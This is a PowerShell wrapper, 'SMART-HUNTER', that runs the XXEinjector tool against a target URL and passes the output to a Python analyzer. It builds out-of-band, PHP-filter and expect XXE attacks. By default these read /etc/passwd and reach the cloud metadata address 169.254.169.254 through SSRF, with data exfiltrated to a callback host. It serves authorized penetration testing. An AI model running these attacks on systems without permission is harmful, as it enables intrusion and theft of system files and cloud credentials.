<#
.SYNOPSIS
SMART-HUNTER XXE Vulnerability Scanner Wrapper for XXEinjector

.DESCRIPTION
Executes XXEinjector and analyzes the output for XXE vulnerabilities.

.PARAMETER Target
The target URL to scan.

.PARAMETER Mode
The scan mode (detect, classic, blind-oob, etc.)

.PARAMETER Host
Your IP address (required for callback servers).

.PARAMETER Collaborator
Your Burp Collaborator or Interactsh URL.

.PARAMETER File
File to read (default: /etc/passwd).

.PARAMETER InternalUrl
Internal URL for SSRF (default: http://169.254.169.254/).

.PARAMETER UploadEndpoint
Endpoint for SVG upload (default: /upload).
#>
param (
    [Parameter(Mandatory=$true)][string]$Target,
    [string]$Mode = "full",
    [string]$HostIP = "127.0.0.1",
    [string]$Collaborator = "",
    [string]$File = "/etc/passwd",
    [string]$InternalUrl = "http://169.254.169.254/",
    [string]$UploadEndpoint = "/upload"
)

Write-Host "[!] WARNING: This tool is for use in authorized environments only." -ForegroundColor Yellow
Write-Host "[*] Target: $Target" -ForegroundColor Cyan
Write-Host "[*] Mode: $Mode" -ForegroundColor Cyan

# Check Dependencies
if (!(Get-Command ruby -ErrorAction SilentlyContinue)) {
    Write-Host "[-] Ruby is not installed. XXEinjector requires Ruby." -ForegroundColor Red
    exit 1
}

if (!(Test-Path -Path "XXEinjector" -PathType Container)) {
    Write-Host "[-] XXEinjector directory not found. Please ensure it was cloned properly." -ForegroundColor Red
    exit 1
}

# Setup Results Directory
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$ResultsDir = "results\xxe_$Timestamp"
New-Item -ItemType Directory -Force -Path $ResultsDir | Out-Null

$StartTime = Get-Date

# Prepare HTTP Request file
Write-Host "[*] Preparing payload and template..." -ForegroundColor Yellow
$TempReq = "xxe_temp_request.txt"
$TargetHost = ([System.Uri]$Target).Host
(Get-Content xxe_templates\stock_check.txt) -replace 'TARGET_HOST', $TargetHost | Set-Content $TempReq

# Run XXEinjector
Write-Host "[*] Running XXEinjector..." -ForegroundColor Yellow

if ($Mode -eq "full") {
    Write-Host "[*] Full Mode: Running comprehensive tests (OOB, PHP Filter, Expect)..." -ForegroundColor Yellow
    $Cmd1 = "ruby XXEinjector\XXEinjector.rb --host=$HostIP --file=$TempReq --path=$File --oob=http --output=$ResultsDir"
    $Cmd2 = "ruby XXEinjector\XXEinjector.rb --host=$HostIP --file=$TempReq --path=$File --phpfilter --output=$ResultsDir"
    
    Write-Host "[*] Executing OOB Test..." -ForegroundColor Cyan
    Invoke-Expression $Cmd1 | Out-File "$ResultsDir\xxeinjector.log" -Append
    
    Write-Host "[*] Executing PHP Filter Test..." -ForegroundColor Cyan
    Invoke-Expression $Cmd2 | Out-File "$ResultsDir\xxeinjector.log" -Append
} else {
    $Command = "ruby XXEinjector\XXEinjector.rb --host=$HostIP --file=$TempReq --path=$File --output=$ResultsDir"
    if ($Mode -eq "blind-oob") { $Command += " --oob=http" }
    if ($Mode -eq "error-based") { $Command += " --expect" } # Simplified mapping

    Write-Host "[*] Executing: $Command" -ForegroundColor Cyan
    try {
        Invoke-Expression $Command | Out-File "$ResultsDir\xxeinjector.log"
    } catch {
        Write-Host "[-] Error executing XXEinjector: $_" -ForegroundColor Red
    }
}

$EndTime = Get-Date
$DurationSpan = $EndTime - $StartTime
$DurationStr = "$([math]::Round($DurationSpan.TotalSeconds))s"
if ($DurationSpan.TotalSeconds -gt 60) {
    $DurationStr = "$([math]::Floor($DurationSpan.TotalMinutes))m $([math]::Round($DurationSpan.Seconds))s"
}

Remove-Item -Path $TempReq -ErrorAction SilentlyContinue

# Analyze Results using Python Script
Write-Host "[*] Analysis complete. Generating report..." -ForegroundColor Yellow
$PythonCmd = "python xxe_analyzer.py --target `"$Target`" --mode `"$Mode`" --duration `"$DurationStr`" --logdir `"$ResultsDir`""
Invoke-Expression $PythonCmd | Tee-Object -FilePath "$ResultsDir\report.txt"

Write-Host "[+] Scan finished. Full report saved to $ResultsDir\report.txt" -ForegroundColor Green
